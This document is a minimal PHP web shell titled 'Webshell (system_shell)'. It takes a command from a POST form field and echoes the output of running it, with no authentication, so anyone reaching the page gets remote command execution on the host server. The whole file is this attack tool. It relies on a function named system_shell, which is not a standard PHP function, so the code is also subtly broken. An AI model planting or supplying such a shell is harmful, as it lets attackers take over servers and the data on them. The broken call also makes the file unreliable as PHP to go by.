<?php
if (isset($_POST['cmd'])) {
    $command = $_POST['cmd'];
    $output = '';

    if (function_exists('system_shell')) {
        $output = system_shell($command);
    } else {
        $output = "The 'system_shell' function is not enabled.";
    }

    echo $output;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Webshell (system_shell)</title>
</head>
<body>
    <form method="POST" action="">
        <input type="text" name="cmd" placeholder="Enter a command">
        <input type="submit" value="Send">
    </form>
</body>
</html>

